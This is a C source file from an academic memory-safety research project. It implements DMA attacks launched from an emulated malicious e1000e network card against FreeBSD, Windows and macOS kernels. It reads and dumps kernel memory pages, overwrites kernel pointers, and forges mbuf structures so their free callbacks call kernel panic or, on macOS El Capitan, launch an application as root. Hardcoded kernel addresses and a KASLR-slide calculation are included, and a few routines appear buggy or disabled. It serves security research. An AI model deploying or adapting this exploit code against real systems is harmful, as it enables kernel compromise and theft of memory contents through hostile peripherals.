/*-
 * SPDX-License-Identifier: BSD-2-Clause
 * 
 * Copyright (c) 2015-2018 Colin Rothwell
 * Copyright (c) 2015-2018 A. Theodore Markettos
 * 
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237
 * ("CTSRD"), as part of the DARPA CRASH research programme.
 * 
 * This software was developed by the University of Cambridge Computer
 * Laboratory (Department of Computer Science and Technology)
 * as part of the IOSEC - Protection and Memory Safety for Input/Output
 * Security project, funded by EPSRC grant EP/R012458/1.
 * 
 * We acknowledge the support of Arm Ltd.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdbool.h>
#include <stdio.h>
#include <time.h>

#include "attacks.h"
#include "crhexdump.h"
#include "freebsd-queue.h"
#include "hw/pci/pci.h"
#include "hw/net/e1000_regs.h"
#include "hw/net/e1000e_core.h"
#include "mbuf-page.h"
#include "pcie.h"
#include "pcie-debug.h"
#include "secret_position.h"

/* This has to come last because of macOS's bloody stupid approach to mbuf
 * members
 */

#ifdef VICTIM_MACOS
#include "macos-mbuf-manipulation.h"
#else
#include <sys/param.h>
#include <sys/mbuf.h>
#endif

/*
 * Attack tool kit types
 * ---------------------------------------------------------------------------
 */
extern FILE *GLOBAL_BINARY_FILE;
bool tracking_window;

void
print_mbuf_flags(int mbuf_flags_field)
{
#ifdef VICTIM_MACOS
	puts("DON'T KNOW HOW TO PRINT MACOS FLAGS :(");
#else
	static const int flag_count = 22;
	static const int flags[flag_count] = {
		M_EXT,
		M_PKTHDR,
		M_EOR,
		M_RDONLY,
		M_BCAST,
		M_MCAST,
		M_PROMISC,
		M_VLANTAG,
		M_UNUSED_8,
		M_NOFREE,
		M_PROTO1,
		M_PROTO2,
		M_PROTO3,
		M_PROTO4,
		M_PROTO5,
		M_PROTO6,
		M_PROTO7,
		M_PROTO8,
		M_PROTO9,
		M_PROTO10,
		M_PROTO11,
		M_PROTO12
	};

#define CASE(flag)														\
case flag:																\
	printf( #flag " ");													\
	break

	for (int i = 0; i < flag_count; ++i) {
		switch (mbuf_flags_field & flags[i]) {
			CASE(M_EXT);
			CASE(M_PKTHDR);
			CASE(M_EOR);
			CASE(M_RDONLY);
			CASE(M_BCAST);
			CASE(M_MCAST);
			CASE(M_PROMISC);
			CASE(M_VLANTAG);
			CASE(M_UNUSED_8);
			CASE(M_NOFREE);
			CASE(M_PROTO1);
			CASE(M_PROTO2);
			CASE(M_PROTO3);
			CASE(M_PROTO4);
			CASE(M_PROTO5);
			CASE(M_PROTO6);
			CASE(M_PROTO7);
			CASE(M_PROTO8);
			CASE(M_PROTO9);
			CASE(M_PROTO10);
			CASE(M_PROTO11);
			CASE(M_PROTO12);
		}
	}

#undef CASE
#endif /* def VICTIM_MACOS */
}

inline uint32_t
bswap24(uint32_t x)
{
	return ((x & 0xFF0000) >> 16) | (x & 0x00FF00) | ((x & 0x0000FF) << 16);
}

#ifndef VICTIM_MACOS
void
endianness_swap_freebsd_mbuf_header(struct mbuf *mbuf)
{
#define FIX_32_FIELD(field)	field = (typeof(field))le32_to_cpu((int32_t)field)
#define FIX_64_FIELD(field)	field = (typeof(field))le64_to_cpu((int64_t)field)

	FIX_64_FIELD(mbuf->m_next);
	FIX_64_FIELD(mbuf->m_nextpkt);
	FIX_64_FIELD(mbuf->m_data);
	FIX_32_FIELD(mbuf->m_len);
	mbuf->m_flags = bswap24(mbuf->m_flags);
	FIX_64_FIELD(mbuf->m_ext.ext_cnt);
	FIX_64_FIELD(mbuf->m_ext.ext_buf);
	FIX_32_FIELD(mbuf->m_ext.ext_size);
	mbuf->m_ext.ext_flags = bswap24(mbuf->m_ext.ext_flags);
	FIX_64_FIELD(mbuf->m_ext.ext_free);
	FIX_64_FIELD(mbuf->m_ext.ext_arg1);
	FIX_64_FIELD(mbuf->m_ext.ext_arg2);

#undef FIX_32_FIELD
#undef FIX_64_FIELD
}

void
print_freebsd_mbuf_information(const struct mbuf *mbuf)
{
	printf("m_next: %p.\n", mbuf->m_next);
	printf("m_nextpkt: %p.\n", mbuf->m_nextpkt);
	printf("m_data: %p.\n", mbuf->m_data);
	printf("m_len: %d.\n", mbuf->m_len);
	printf("m_type: 0x%x\n", mbuf->m_type);
	printf("m_flags: 0x%x (", mbuf->m_flags);
	print_mbuf_flags(mbuf->m_flags);
	puts(")");
}
#endif


void
print_buffer_address_information(E1000ECore *core, ConstDescriptorP descriptor)
{
	struct mbuf mbuf_buffer;

	hwaddr ba = descriptor->buffer_addr;

	printf("Buffer: 0x%lx.", ba);
	if (ba % 2048 == 0) {
		puts("Address is 2K aligned. Probably cluster. ");
	} else {
		putchar('\n');
		pci_dma_read(core->owner, ba & ~0xFF, (uint8_t *)(&mbuf_buffer),
			sizeof(struct mbuf));
#ifdef VICTIM_MACOS
		endianness_swap_mac_mbuf_header(&mbuf_buffer);
		print_macos_mbuf_header(&mbuf_buffer);
#else
		endianness_swap_freebsd_mbuf_header(&mbuf_buffer);
		print_freebsd_mbuf_information(&mbuf_buffer);
#endif
	}
	/*hexdump((uint8_t *)(&mbuf_buffer), 256);*/
}

struct window {
	uint64_t base;
	uint64_t length;
	uint64_t checksum;
};

struct window tracked_window;

static inline void
print_window(const struct window * const entry)
{
	printf("window 0x%lx (%ld bytes)", entry->base, entry->length);
}

int window_list_length, window_list_min_length, window_list_max_length;

/* This could be done with better performance with an SLIST, but this requires
 * a really unpleasantly complicated system for iterating through the loop
 * while potentially removing elements (repeatedly checking the head in case
 * you delete it, and you need a new head, and then checking the 'next'
 * elemeent constantly, so you still have the handle to the 'current' element
 * to remove afterwards. I used to do this, but then I basically had to write
 * the code again, and couldn't think of a good abstraction.
 *
 * XXX cr437: I have been quite stupid here. There is equally the macro
 * SLIST_FOREACH_SAFE.
 */

LIST_HEAD(window_list_head, window_list_entry) window_list_head
	= LIST_HEAD_INITIALIZER(window_list_head);


struct window_list_entry {
	struct window window;
	LIST_ENTRY(window_list_entry) window_list;
};

clock_t start_time;

/* I don't like using the constructor attribute, but it's the simplest way to
 * go about this.
 */
__attribute__((constructor))
void
initialise_window_list()
{
	printf("INIT PAGE LIST\n");
	LIST_INIT(&window_list_head);
	window_list_length = 0;
	window_list_min_length = 0;
	window_list_max_length = 0;
	start_time = clock();
	tracking_window = false;
}

static inline void
adjust_window_list_length(int diff)
{
	window_list_length += diff;
	/*printf("%d ", window_list_length);*/
	/*fflush(stdout);*/
	/*if (window_list_length > window_list_max_length) {*/
		/*window_list_max_length = window_list_length;*/
		/*printf("Window list new max length: %d.\n", window_list_length);*/
	/*} else if (window_list_length < window_list_min_length) {*/
		/*window_list_min_length = window_list_length;*/
		/*printf("Window list new min length: %d.\n", window_list_length);*/
	/*}*/
}

bool
window_in_list(struct window window)
{
	struct window_list_entry *window_list_entry;
	LIST_FOREACH(window_list_entry, &window_list_head, window_list) {
		if (window.base == window_list_entry->window.base &&
			window.length == window_list_entry->window.length) {
			return true;
		}
	}
	return false;
}

void
check_windows_for_secret(E1000ECore *core)
{
	assert(false); /* XXX THIS USES FUNCTIONS THAT ARE BITROTTED FOR EXPERIMENT */
	int read_result;
	uint8_t page[4096];
	struct window_list_entry *entry, *temp;

	if ((clock() - start_time) < 20000) {
		/*printf("%d\n", window_list_length);*/
		return;
	}

	/*putchar('c'); fflush(stdout);*/

	LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {
		read_result = perform_dma_long_read(page, entry->window.length,
			core->owner->devfn, 8, entry->window.base);
		if (read_result == DRR_SUCCESS) {
			/*check_for_secret(&(entry->window), page);*/
		} else {
			LIST_REMOVE(entry, window_list);
			free(entry);
			adjust_window_list_length(-1);
		}
	}
}

uint64_t
checksum_window(uint8_t page[4096])
{
	uint64_t sum = 0;
	uint64_t *page_as_uint64 = (uint64_t *)page;
	for (int i = 0; i < (4096 / sizeof(uint64_t)); ++i) {
		sum += page_as_uint64[i];
	}
	return sum;
}

void
mangle_kernel_pointers(E1000ECore *core, dma_addr_t descriptor_addr,
	void *opaque)
{
	int read_result;
	uint64_t page_address, kernel_pointer_address;
	struct e1000_tx_desc desc;
	uint8_t page[4096];
	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
	page_address = page_base_address(le64_to_cpu(desc.buffer_addr));

	if (page_address == 0) {
		return;
	}

	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
		page_address);

	uint64_t little_buffer, deadbeef = cpu_to_le64(0xDEADBEEFBEDEDEAD);

	int kernel_pointer_location = -4;

	if (read_result == DRR_SUCCESS) {
		while (true) {
			kernel_pointer_location = secret_position(page,
				kernel_pointer_location + 4, 0xFF, 4);
			if (kernel_pointer_location == -1) {
				break;
			} else {
				kernel_pointer_address = page_address | kernel_pointer_location;
				/*putchar('m');*/
				/*fflush(stdout);*/
				printf("kp 0x%lx.\n", kernel_pointer_address);
				perform_dma_write((uint8_t *)&deadbeef, sizeof(deadbeef),
					core->owner->devfn, 8, kernel_pointer_address);
				perform_dma_read((uint8_t *)&little_buffer,
					sizeof(little_buffer), core->owner->devfn, 8,
					kernel_pointer_address);
				if (little_buffer != deadbeef) {
					printf("Wrote 0x%lx to 0x%lx, but read 0x%lx.\n",
						kernel_pointer_address, deadbeef, little_buffer);
				}
			}
		}
	} else {
		putchar('e');
		printf("pa 0x%lx.\n", page_address);
		fflush(stdout);
	}
}

void
store_open_window_from_tx_ring(E1000ECore *core, ConstDescriptorP descriptor)
{
	struct window window;
	window.base = descriptor->buffer_addr;
	window.length = descriptor->length;

	uint64_t window_page_base_address = page_base_address(window.base);

	/* XXX: WINDOW TRACKING */
	window.base = window_page_base_address;
	window.length = 4096;

	int read_result;
	uint8_t page[4096];

	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
		window_page_base_address);

	if (read_result == DRR_SUCCESS) {
		if (secret_position(page, 0, 'i', 8) != -1) {
			putchar('s');
			fflush(stdout);
			tracking_window = true;
			window.checksum = checksum_window(page);
			tracked_window = window;
			fwrite(page, 1, 4096, GLOBAL_BINARY_FILE);
		}
	} else {
		printf("Couldn't read page! Weird :(.\n");
	}
}

void
write_window_if_changed(E1000ECore *core)
{
	int read_result;
	uint8_t page[4096];
	uint64_t new_checksum;

	if (!tracking_window) {
		return;
	}

	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
		tracked_window.base);

	if (read_result == DRR_SUCCESS) {
		new_checksum = checksum_window(page);
		if (new_checksum != tracked_window.checksum) {
			tracked_window.checksum = new_checksum;
			fwrite(page, 1, 4096, GLOBAL_BINARY_FILE);
			putchar('c');
			fflush(stdout);
		}
	} else {
		putchar('E');
		fflush(stdout);
		tracking_window = false;
	}
}

const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
const void *KERNEL_PANIC_ADDR =		(void *)0xffffffff80a0b9a0ll;

void
attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
{
#ifdef VICTIM_FREEBSD
	char buffer[256];
	struct mbuf *mbuf = (struct mbuf *)(buffer);
	char *data_buffer = (buffer + sizeof(struct mbuf));

	PDBG("Attempting to subvert buffer with address 0x%lx.", ba);

	if ((ba % 2048) == 0) {
		PDBG("Buffer is probably a cluster.");
		return; /* Probably a cluster */
	}


	pci_dma_read(core->owner, ba & ~0xFF, mbuf, sizeof(struct mbuf));
	endianness_swap_freebsd_mbuf_header(mbuf);

	uint64_t kernel_mbuf_addr = (uint64_t)mbuf->m_data & ~0xFF;
	PDBG("Kernel's address for mbuf: 0x%lx.", kernel_mbuf_addr);

	/*
	 * In order for the free function to be called, the mbuf needs to have a
	 * non-null, non-zero pointer as a reference count. We are guaranteed 120
	 * bytes of space in the mbuf after its header, so we write there.
	 */

	uint32_t *ext_cnt = (uint32_t *)data_buffer;
	*ext_cnt = bswap32(1);

	/*
	 * If it attempts to free the mbuf, it gets into alignemnt issues.
	 */
	mbuf->m_flags |= M_EXT | M_NOFREE;
	mbuf->m_ext.ext_type = EXT_EXTREF;
	mbuf->m_ext.ext_cnt = (u_int *)(kernel_mbuf_addr + sizeof(struct mbuf));
	mbuf->m_ext.ext_free = KERNEL_PANIC_ADDR;
	/* m_next is the value given as the first argument of the called function.
	 */
	mbuf->m_next = (struct mbuf *)(kernel_mbuf_addr + sizeof(struct mbuf) + 8);

	endianness_swap_freebsd_mbuf_header(mbuf);

	/*
	 * Have to write this after the conversion, because it collides with mbuf
	 * fields, and doesn't want to be swapped about.
	 */

	buffer[0] = 'B';
	buffer[1] = 'A';
	buffer[2] = 'D';
	buffer[3] = ' ';
	buffer[4] = 'N';
	buffer[5] = 'I';
	buffer[6] = 'C';
	buffer[7] = '!';
	buffer[8] = '\n';
	buffer[9] = 0;

	PDBG("DMA writing to addr %lx", ba & ~0xFF);
	pci_dma_write(core->owner, ba & ~0xFF, buffer, 256);
#endif
}

static inline hwaddr
page_addr(hwaddr addr)
{
	return addr & ~((1LL << 12) - 1);
}

void
print_page(E1000ECore* core, hwaddr ba)
{
	const int ROW_SIZE = 16;
	hwaddr print_addr, page_base, page_limit;
	page_base = page_addr(ba);
	page_limit = page_addr(ba + 4096);
	printf("Printing page containg addr 0x%lx (0x%lx -> 0x%lx).\n", ba,
		page_base, page_limit);
	uint8_t buffer[ROW_SIZE];

	for (print_addr = page_base; print_addr < page_limit;
		print_addr += ROW_SIZE)
	{
		pci_dma_read(core->owner, print_addr, &buffer, ROW_SIZE);

		printf("0x%0lx   ", print_addr);

		for (int i = 0; i < ROW_SIZE; ++i) {
			printf("%02x ", buffer[i]);

			if (((i + 1) % 4) == 0) {
				putchar(' ');
			}
			if (((i + 1) % 8) == 0) {
				putchar(' ');
			}
		}

		putchar('\n');

		for (int j = 0; j < 1024; ++j) {
			asm("nop");
		}
	}
}

void
attempt_to_subvert_windows(E1000ECore* core, hwaddr ba)
{
	/* Emprically detirmined by atm26:
	 * - NET_BUFFER_LIST at ffffb08618300030
	 * - function pointer at +0x50
	 * - signature of 0x422005b4 at +0xa0
	 * - NET_BUFFER at ffffb086183001a0
	 * - MDL at ffffb08618300270 (54 byte payload buffer with Ethernet headers)
	 * - MDL at ffffb08615c032f0 (64240 byte payload buffer of Jumbo frame)
	 * 0xffffb08618300030
	 * 0xffffb08618300270
	 */
	const hwaddr NET_BUFFER_LIST_OFFSET =
		0xffffb08618300270LL - 0xffffb08618300030LL;
	const hwaddr SIGNATURE_OFFSET = 0xa0;
	const uint64_t EXPECTED_SIGNATURE = 0x422005b4;
	const uint64_t FP_OFFSET = 0x50;
	const uint64_t EXPECTED_SEND_FP = -1;
	const uint64_t WINDOWS_PAGE_MASK = (1LL << 13) - 1;
	const uint64_t NEW_FP_BASE = -1;

	hwaddr net_buffer_list_addr = ba - NET_BUFFER_LIST_OFFSET;
	hwaddr signature_addr = net_buffer_list_addr + SIGNATURE_OFFSET;

	uint64_t signature;
	pci_dma_read(core->owner, signature_addr, &signature, 8);
	signature = le64_to_cpu(signature);

	if (signature != EXPECTED_SIGNATURE) {
		printf("Signature was: 0x%lx, but expected 0x%lx. Ignoring buffer.\n",
			signature, EXPECTED_SIGNATURE);
		return;
	}

	hwaddr fp_addr = net_buffer_list_addr + FP_OFFSET;
	hwaddr kaslr_slide;

	uint64_t fp;
	pci_dma_read(core->owner, fp_addr, &fp, 8);
	fp = le64_to_cpu(signature);

	if ((fp & WINDOWS_PAGE_MASK) != (EXPECTED_SEND_FP & WINDOWS_PAGE_MASK)) {
		printf("FP 0x%lx has different page offset from 0x%lx. "
			"Ignoring buffer.\n",
			fp, EXPECTED_SEND_FP);
		return;
	}

	kaslr_slide = fp - EXPECTED_SEND_FP;
	uint64_t new_fp = NEW_FP_BASE + kaslr_slide;
	new_fp = cpu_to_le64(fp);

	pci_dma_write(core->owner, fp_addr, &new_fp, 8);
}

#define PAGE_ADDR_COUNT 16
static uint64_t _read_page_addrs[PAGE_ADDR_COUNT];
static uint64_t _next_page_index;

void
mark_page_read(hwaddr page_addr)
{
	_read_page_addrs[_next_page_index] = page_addr;
	_next_page_index = (_next_page_index + 1) % PAGE_ADDR_COUNT;
}

bool
page_was_read(hwaddr page_addr)
{
	for (uint64_t i = 0; i < PAGE_ADDR_COUNT; ++i) {
		if (_read_page_addrs[i] == page_addr) {
			return true;
		}
	}
	return false;
}

void
reset_read_pages()
{
	_next_page_index = 0;
	putchar('R');
	fflush(stdout);
}

void
save_mbufs_to_file(E1000ECore* core, ConstDescriptorP desc)
{
	if (desc->buffer_addr % MCLBYTES == 0) {
		return; /* Cluster */
	}

	enum dma_read_response read_result;
	struct mbuf_page mbuf_page;
	mbuf_page.iovaddr = page_base_address(desc->buffer_addr);
	if (page_was_read(mbuf_page.iovaddr)) {
		return;
	}
	mark_page_read(mbuf_page.iovaddr);
	read_result = perform_dma_long_read((uint8_t *)mbuf_page.contents, 4096,
		core->owner->devfn, 8, mbuf_page.iovaddr);
	fwrite(&mbuf_page, sizeof(struct mbuf_page), 1, GLOBAL_BINARY_FILE);
	putchar('w');
	fflush(stdout);
}

#ifdef VICTIM_MACOS_HIGH_SIERRA
const static uint64_t HIGH_SIERRA_BIGFREE =			0xffffff8000baa2d0;
const static uint64_t HIGH_SIERRA_16KFREE =			0xffffff8000baa300;
const static uint64_t HIGH_SIERRA_MCACHE_PANIC =	0xffffff8000b78580;
const static uint64_t NOT_1MB_MASK =				0xfffffffffff00000;
const static uint64_t ONE_MB_MASK =					0x00000000000fffff;
const static uint64_t ONE_MB_MCACHE_PANIC =
	HIGH_SIERRA_MCACHE_PANIC & ONE_MB_MASK;
/* We could use 21 bits, but these agree to 20 bits, and it's a slightly
 * simpler mask.
 */

void
attack_high_sierra(E1000ECore* core, ConstDescriptorP desc)
{
	if (desc->buffer_addr % MCLBYTES == 0) {
		return;
	}

	enum dma_read_response read_result;
	struct mbuf mbuf;
	uint64_t mbuf_address;
	uint64_t blinded_kernel_address;
	uint64_t blind_bits;
	uint64_t low_blind_bits;
	uint64_t blinded_panic_address;
	hwaddr page_addr = page_base_address(desc->buffer_addr);
	if (page_was_read(page_addr)) {
		return;
	}
	mark_page_read(page_addr);
	putchar('m');
	fflush(stdout);
	for (uint i = 0; i < MBUFS_PER_PAGE; ++i) {
		mbuf_address = page_addr + i * sizeof(mbuf);
		read_result = perform_dma_read((uint8_t *)&mbuf, sizeof(mbuf),
			core->owner->devfn, 8, mbuf_address);
		endianness_swap_mac_mbuf_header(&mbuf);
		if (mbuf.MM_LEN > 0 && mbuf.MM_EXT.ext_size <= (2 * M16KCLBYTES) && (
				mbuf.MM_LEN > MCLBYTES || mbuf.MM_EXT.ext_size > MCLBYTES)) {
			blinded_kernel_address = mbuf.MM_EXT.ext_free;
			if (mbuf.MM_LEN > MBIGCLBYTES ||
				mbuf.MM_EXT.ext_size > MBIGCLBYTES) {
				printf("16k cluster? len: %d. ext_size: %u.\n",
					mbuf.MM_LEN, mbuf.MM_EXT.ext_size);
				blind_bits = blinded_kernel_address ^= HIGH_SIERRA_16KFREE;
			} else {
				printf("4K cluster? len: %d. ext_size: %u.\n",
					mbuf.MM_LEN, mbuf.MM_EXT.ext_size);
				blind_bits = blinded_kernel_address ^ HIGH_SIERRA_BIGFREE;
			}
			low_blind_bits = blind_bits & ONE_MB_MASK;
			blind_bits &= NOT_1MB_MASK;
			blinded_panic_address = low_blind_bits & ONE_MB_MCACHE_PANIC;
			mbuf.MM_EXT.ext_free = blind_bits | blinded_panic_address;
			endianness_swap_mac_mbuf_header(&mbuf);
			perform_dma_write((uint8_t *)&mbuf, sizeof(mbuf),
				core->owner->devfn, 8, mbuf_address);
		}
	}
}
#endif

#ifdef VICTIM_MACOS_EL_CAPITAN

const uint64_t MBUF_EMPTY_OFFSET =
	sizeof(struct m_hdr) + sizeof(struct pkthdr) + sizeof(_m_ext_t);
const uint64_t EL_CAPITAN_PANIC        = 0xffffff80002de6b0;
const uint64_t EL_CAPITAN_KUNC_EXECUTE = 0xffffff80002b7530;

/* From: KUNCUserNotifications.h
 * Execute a userland executable with the given path, user and type
 */

#define kOpenApplicationPath 	0	/* essentially executes the path */
#define kOpenPreferencePanel    1	/* runs the preferences with the foo.preference opened.  foo.preference must exist in /System/Library/Preferences */
#define kOpenApplication	2	/* essentially runs /usr/bin/open on the passed in application name */


#define kOpenAppAsRoot		0
#define kOpenAppAsConsoleUser	1

bool
should_subvert_mbuf(const struct mbuf * const mbuf)
{
	return mbuf->MM_TYPE != MT_FREE && (mbuf->MM_FLAGS & M_PKTHDR) &&
		!(mbuf->MM_FLAGS & M_EXT);
}

void
subvert_mbuf(struct mbuf *mbuf, uint64_t kernel_mbuf_addr)
{
	char *chars;
	uint32_t *refcount, *flags;
	mbuf->m_hdr.mh_flags |= M_EXT;
	mbuf->m_hdr.mh_flags &= ~M_PKTHDR;
	mbuf->MM_NEXT = NULL;
	mbuf->MM_NEXTPKT = NULL;
	mbuf->MM_EXT.ext_refflags = kernel_mbuf_addr + MBUF_EMPTY_OFFSET;
	mbuf->MM_EXT.ext_free = EL_CAPITAN_KUNC_EXECUTE;
	mbuf->MM_EXT.ext_buf = kernel_mbuf_addr + offsetof(struct mbuf, MM_PKTHDR);
	mbuf->MM_EXT.ext_size = kOpenAppAsRoot;
	mbuf->MM_EXT.ext_arg = kOpenApplicationPath;
	refcount = (uint32_t *)(((uint8_t *)mbuf) + MBUF_EMPTY_OFFSET);
	*refcount = bswap32(1);
	flags = refcount + 1;
	*flags = 0;
	chars = (char *)(&mbuf->MM_PKTHDR);
	strcpy(chars, "/Applications/iTerm.app/Contents/MacOS/iTerm2");
}

static bool DONE = false;

void
attack_el_capitan(E1000ECore* core, ConstDescriptorP desc)
{
	if (desc->buffer_addr % MCLBYTES == 0 || DONE) {
		return;
	}
	hwaddr page_addr = page_base_address(desc->buffer_addr);
	if (page_was_read(page_addr)) {
		return;
	}
	mark_page_read(page_addr);
	putchar('m');
	fflush(stdout);

	struct mbuf mbufs[MBUFS_PER_PAGE];
	uint32_t i;
	uint64_t mbuf_address,  kernel_mbuf_address;
	uint64_t kernel_page_address = 0;
	perform_dma_long_read((uint8_t*)mbufs, sizeof(struct mbuf) * MBUFS_PER_PAGE,
		core->owner->devfn, 8, page_addr);
	/* First need to find kernel address of page */
	for (i = 0; i < MBUFS_PER_PAGE; ++i) {
		endianness_swap_mac_mbuf_header(&mbufs[i]);
		if (kernel_page_address == 0 && mbufs[i].m_hdr.mh_data % 2048 != 0) {
			kernel_page_address = page_base_address(mbufs[i].m_hdr.mh_data);
		}
	}
	if (kernel_page_address == 0) {
		return;
	}
	for (i = 0; i < MBUFS_PER_PAGE; ++i) {
		mbuf_address = page_addr + i * sizeof(struct mbuf);
		if (!should_subvert_mbuf(&mbufs[i])) {
			continue;
		}
		putchar('s');
		DONE = true;
		kernel_mbuf_address = kernel_page_address + (i * sizeof(struct mbuf));
		subvert_mbuf(&mbufs[i], kernel_mbuf_address);
		endianness_swap_mac_mbuf_header(&mbufs[i]);
		perform_dma_write((uint8_t *)&mbufs[i], 256,
			core->owner->devfn, 8, mbuf_address);
		return;
	}
}

void
attack_el_capitan_only_granted_mbufs(E1000ECore* core, ConstDescriptorP desc)
{
	if (desc->buffer_addr % MCLBYTES == 0) {
		return;
	}
	putchar('n');
	uint64_t kernel_unused, kernel_page_addr, kernel_mbuf_addr;
	uint64_t mbuf_io_addr = desc->buffer_addr & ~uint64_mask(8);
	uint64_t mbuf_io_page_addr = page_base_address(desc->buffer_addr);
	struct mbuf mbuf;
	perform_dma_read((uint8_t *)&mbuf, sizeof(struct mbuf), core->owner->devfn,
		8, mbuf_io_addr);
	endianness_swap_mac_mbuf_header(&mbuf);
	kernel_page_addr = page_base_address(mbuf.MM_DATA);
	kernel_mbuf_addr = kernel_page_addr + (mbuf_io_addr - mbuf_io_page_addr);
	subvert_mbuf(&mbuf, kernel_mbuf_addr);
	endianness_swap_mac_mbuf_header(&mbuf);
	perform_dma_write((uint8_t *)&mbuf, 256, core->owner->devfn, 8,
		mbuf_io_addr);
}

#endif

#if 0
__attribute__((constructor)) void
setup_attack()
{
	reset_read_pages();
	/*register_pre_xmit_hook(attack_high_sierra, reset_read_pages);*/
	/*register_pre_xmit_hook(attack_el_capitan, reset_read_pages);*/
	register_pre_xmit_hook(attack_el_capitan, NULL);
}
#endif